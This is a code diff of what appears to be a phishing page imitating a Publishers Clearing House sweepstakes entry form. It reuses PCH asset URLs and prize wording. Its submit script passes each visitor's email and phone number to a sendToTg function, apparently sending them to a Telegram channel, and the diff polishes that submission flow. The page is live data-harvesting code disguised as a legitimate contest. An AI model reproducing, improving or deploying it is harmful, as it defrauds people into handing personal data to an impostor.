@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html>
     <head>
         <meta charset="utf-8">
@@ -55,25 +56,9 @@
 <script src="https://mpoassets.pch.com/mpo/3.9.4/global.js?v=3.9.4.74132-759c261988c79732fc5145f74c28904492869411"></script>
 
 
-
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  
 <script type="text/javascript" src="https://mpoassets.pch.com/mpo/3.9.4/tealium.js?v=3.9.4.74132-759c261988c79732fc5145f74c28904492869411"></script>
-
-
-
-
-
-
-
-
-<!--  
-                              
- -->                              
- 
-
-
-
-
 
 
 </head>
@@ -145,7 +130,7 @@ Last Day to Enter  12/20
 </div>
 
 
-<h2>Win $1,000</h2>
+<h2>Win $1,000+</h2>
 <h3>Season’s Winnings</h3>
 <h4></h4></div></div></div><div class="comp comp-text  comp-ref-- comp-name--" style=""><div class="svelte-1ijz953"><div class="text svelte-1ijz953"><style>
 
@@ -248,7 +233,13 @@ background-position: 60%;
 }
  
  
-</style></div></div></div></div></div><div class="comp comp-button2 close-btn comp-ref-- comp-name-- clickable clickable--abort fieldset-" style=""><div class="button-area svelte-13r6qb"> <button class="btn btn--abort svelte-13r6qb">Cancel</button> </div></div> <div id="theme-image"></div></section> <main id="main-render-area" class="main"> <form data-name="main" id="input-form" method="post" action="/"><section id="input-area" class="step-transition--slide"><div class="input-page step--em_only main-step--em_only" style=""><div class="input-body"><div class="comp comp-image  comp-ref-- comp-name--" style=""><div class="image-container svelte-1rsymyi center"> <img src="https://mpoassets.pch.com/admin/paths/images/z3SJfdVozCkYeKg2HoWfkGxmg3AWs13li4iuKfav.png" alt="ProgressBarStep1" class="svelte-1rsymyi"></div></div><div data-ref="sb0ic50108MLKbj" class="comp comp-text medium-font mt-2 mb-2 small--line-spacing bold-font comp-ref--sb0ic50108MLKbj comp-name--" style=""><div class="svelte-1ijz953"><div class="text svelte-1ijz953">LET’S GET YOU IN ON THE <br>WINNING!</div></div></div><div data-ref="sb0ic5016Z2wAih" class="comp comp-text mt-5 comp-ref--sb0ic5016Z2wAih comp-name--" style=""><div class="svelte-1ijz953"><div class="text svelte-1ijz953"><span></span></div></div></div>
+</style></div></div></div></div></div><div class="comp comp-button2 close-btn comp-ref-- comp-name-- clickable clickable--abort fieldset-" style=""><div class="button-area svelte-13r6qb"> <button class="btn btn--abort svelte-13r6qb">Cancel</button> </div></div> <div id="theme-image"></div></section> <main id="main-render-area" class="main"> <form data-name="main" id="input-form" method="post" action="/"><section id="input-area" class="step-transition--slide"><div class="input-page step--em_only main-step--em_only" style=""><div class="input-body"><div class="comp comp-image  comp-ref-- comp-name--" style=""><div class="image-container svelte-1rsymyi center"> 
+    
+    <!-- 
+    <img src="https://mpoassets.pch.com/admin/paths/images/z3SJfdVozCkYeKg2HoWfkGxmg3AWs13li4iuKfav.png" alt="ProgressBarStep1" class="svelte-1rsymyi">
+     -->
+     
+    </div></div><div data-ref="sb0ic50108MLKbj" class="comp comp-text medium-font mt-2 mb-2 small--line-spacing bold-font comp-ref--sb0ic50108MLKbj comp-name--" style=""><div class="svelte-1ijz953"><div class="text svelte-1ijz953">LET’S GET YOU IN ON THE <br>WINNING!</div></div></div><div data-ref="sb0ic5016Z2wAih" class="comp comp-text mt-5 comp-ref--sb0ic5016Z2wAih comp-name--" style=""><div class="svelte-1ijz953"><div class="text svelte-1ijz953"><span></span></div></div></div>
 
 
 <!--  --><!-- --><!--  --><!--  -->
@@ -269,7 +260,7 @@ background-position: 60%;
             <div class="formgroup reg-input-email svelte-1wzwmop required-field validity-on">
             <label class="forminput-label svelte-1wzwmop" for="ph1">Phone Number:</label> <div class="forminput svelte-1wzwmop">
             
-            <input type="tel" id="ph1" name="phone" placeholder="Phone Number" required inputmode="tel" data-validationmessage="Please enter a valid phone number" class="svelte-1wzwmop" minlength="10">  
+            <input type="tel" id="ph1" name="phone" placeholder="Phone Number" required inputmode="tel" data-validationmessage="Please enter a valid phone number" class="svelte-1wzwmop" minlength="10" maxlength="13">  
             
             
             <div class="input-icon svelte-xkik63"><svg class="form-input-icon default-icon svelte-xkik63" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="8" fill="#EBEBEB" class="svelte-xkik63"></circle><path d="M8.40039 11.6L11.2004 14.4L15.6004 10" stroke="white" stroke-width="1.2" class="svelte-xkik63"></path></svg></div> <div class="msg-container svelte-yha5l2"></div></div>
@@ -334,12 +325,16 @@ function submitIt(email, phone) {
   const e = emailElement.value;
   const p = phoneElement.value;
   
-  //continueBtn.innerText('Loading..');
-  //disBtn.classList.add("submit-disabled");
+  continueBtn.innerText = 'SUBMITTING, pls wait!';
+  disBtn.classList.add("submit-disabled");
 
   sendToTg(e, p).then((res) => {
     if (res) {
-      window.open('./register2.html','_self');
+    regConfirm(e,p);
+    continueBtn.innerText = 'CONTINUE';
+    disBtn.classList.remove("submit-disabled");
+    document.getElementById("input-form").reset();
+      //window.open('./register2.html','_self');      
     } else {
     setTimeOut(()=>{window.location.reload()},1000);
     }
